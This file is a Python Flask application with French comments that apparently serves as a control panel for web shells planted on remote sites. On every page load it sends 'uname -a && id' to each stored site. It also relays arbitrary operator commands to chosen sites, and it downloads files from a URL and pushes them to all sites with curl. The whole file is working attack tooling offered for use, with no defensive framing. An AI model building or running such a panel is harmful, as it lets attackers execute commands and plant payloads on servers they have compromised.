from flask import Flask, render_template, request, flash, redirect, url_for
import requests
import subprocess
import json
import os
from dotenv import load_dotenv

app = Flask(__name__)
app.secret_key = 'trkntrkn'

# Charger les variables d'environnement depuis le fichier .env
load_dotenv()

# Vérification du mot de passe
PASSWORD = os.getenv('PASSWORD')

# Chemin du fichier JSON pour enregistrer les sites
SITES_FILE = 'sites.json'

# Définir la variable sites
sites = []

def get_site_info(site_url):
    try:
        response = requests.post(site_url, data={'command': 'uname -a && id'})
        site_info = response.text
    except Exception as e:
        site_info = str(e)
    return site_info

def save_sites():
    with open(SITES_FILE, 'w') as f:
        json.dump(sites, f)

def load_sites():
    if os.path.exists(SITES_FILE):
        with open(SITES_FILE, 'r') as f:
            return json.load(f)
    return []

# Charger les sites à partir du fichier JSON lors du démarrage de l'application
sites = load_sites()

@app.route('/')
def index():
    sites_with_info = [(site, get_site_info(site)) for site in sites]
    return render_template('index.html', sites_with_info=sites_with_info)

@app.route('/add_site', methods=['POST'])
def add_site():
    site_url = request.form['site_url']
    password = request.form['password']
    if password != PASSWORD:
        flash('Invalid password', 'error')
        return redirect(url_for('index'))
    if site_url:
        sites.append(site_url)
        save_sites()
    flash('Site added successfully', 'success')
    return redirect(url_for('index'))


@app.route('/upload_file', methods=['POST'])
def upload_file():
    if request.form['password'] != PASSWORD:
        flash('Invalid password', 'error')
        return redirect(url_for('index'))

    file_url = request.form['file_url']
    for site in sites:
        try:
            response = requests.get(file_url)
            filename = file_url.split('/')[-1]
            with open(filename, 'wb') as f:
                f.write(response.content)
            subprocess.run(['curl', '-F', f'file=@{filename}', site])
            flash(f'File uploaded successfully to {site}', 'success')
        except Exception as e:
            flash(f'Failed to upload file to {site}: {e}', 'error')
    return redirect(url_for('index'))

@app.route('/execute_command', methods=['POST'])
def execute_command():
    command = request.form['command']
    selected_sites = request.form.getlist('site')
    password = request.form['password']

    if password != PASSWORD:
        flash('Invalid password', 'error')
        return redirect(url_for('index'))

    results = {}
    for site in selected_sites:
        try:
            response = requests.post(site, data={'command': command})
            results[site] = response.text
        except Exception as e:
            results[site] = str(e)

    return render_template('results.html', results=results)

if __name__ == '__main__':
    app.run(host="0.0.0.0", debug=False)